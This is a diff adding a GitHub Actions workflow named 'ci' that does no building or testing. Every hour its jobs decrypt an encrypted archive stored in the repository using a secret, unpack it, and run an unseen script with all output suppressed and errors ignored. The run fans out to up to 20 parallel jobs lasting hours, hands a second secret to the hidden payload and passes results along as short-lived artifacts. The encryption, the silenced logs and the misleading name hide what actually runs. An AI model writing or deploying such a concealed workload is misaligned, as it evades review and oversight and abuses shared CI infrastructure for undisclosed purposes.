@@ -1,0 +1,85 @@
+name: ci
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 * * * *'
+concurrency: { group: p, cancel-in-progress: false }
+permissions: { contents: read, actions: read }
+env:
+  K: ${{ secrets.S2 }}
+jobs:
+  g:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    outputs: { t: "${{ steps.s.outputs.t }}", mx: "${{ steps.s.outputs.mx }}" }
+    steps:
+      - uses: actions/checkout@v4
+      - id: s
+        env: { GH: "${{ github.token }}", MX_OUT: "/tmp/mx.json" }
+        run: |
+          mkdir w && cat d? | openssl enc -d -aes-256-cbc -pbkdf2 -pass env:K | tar xz -C w
+          cd w && t=$(./x.sh g 2>/dev/null | tail -1); [ -z "$t" ] && t=none
+          echo "t=$t" >> $GITHUB_OUTPUT; echo "mx=$(cat /tmp/mx.json 2>/dev/null || echo '[]')" >> $GITHUB_OUTPUT
+          echo x > ../y.txt
+      - if: steps.s.outputs.t != 'none'
+        uses: actions/upload-artifact@v4
+        with: { name: "y-${{ steps.s.outputs.t }}-${{ github.run_id }}", path: y.txt, retention-days: 4 }
+  a:
+    needs: g
+    if: needs.g.outputs.t != 'none'
+    runs-on: ubuntu-latest
+    timeout-minutes: 330
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix: { include: "${{ fromJSON(needs.g.outputs.mx) }}" }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 20 }
+      - uses: actions/setup-python@v5
+        with: { python-version: '3.12' }
+      - run: |
+          mkdir w && cat d? | openssl enc -d -aes-256-cbc -pbkdf2 -pass env:K | tar xz -C w
+          cd w && (pip install -q -r requirements.txt && npm i --silent) >/dev/null 2>&1
+          ./x.sh s ${{ matrix.m }} ${{ matrix.i }} ${{ matrix.n }} >/dev/null 2>&1 || true
+      - uses: actions/upload-artifact@v4
+        with: { name: "p${{ matrix.m }}${{ matrix.i }}", path: o.bin, retention-days: 1 }
+  b:
+    needs: [g, a]
+    if: always() && needs.g.outputs.t != 'none'
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix: { m: [a, b] }
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with: { node-version: 20 }
+      - uses: actions/setup-python@v5
+        with: { python-version: '3.12' }
+      - uses: actions/download-artifact@v4
+        with: { pattern: "p${{ matrix.m }}*", path: in }
+      - env: { T: "${{ secrets.S1 }}" }
+        run: |
+          mkdir w && cat d? | openssl enc -d -aes-256-cbc -pbkdf2 -pass env:K | tar xz -C w
+          cd w && (pip install -q -r requirements.txt && npm i --silent) >/dev/null 2>&1
+          ./x.sh f ${{ matrix.m }} >/dev/null 2>&1 || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: { name: "r${{ matrix.m }}", path: o.bin, retention-days: 3 }
+  c:
+    needs: [g, b]
+    if: always() && needs.g.outputs.t != 'none'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/download-artifact@v4
+        with: { pattern: "r*", path: in }
+      - run: |
+          mkdir w && cat d? | openssl enc -d -aes-256-cbc -pbkdf2 -pass env:K | tar xz -C w
+          cd w && ./x.sh c >/dev/null 2>&1 || true
+      - uses: actions/upload-artifact@v4
+        with: { name: "z-${{ needs.g.outputs.t }}", path: z.txt, retention-days: 4, if-no-files-found: ignore }
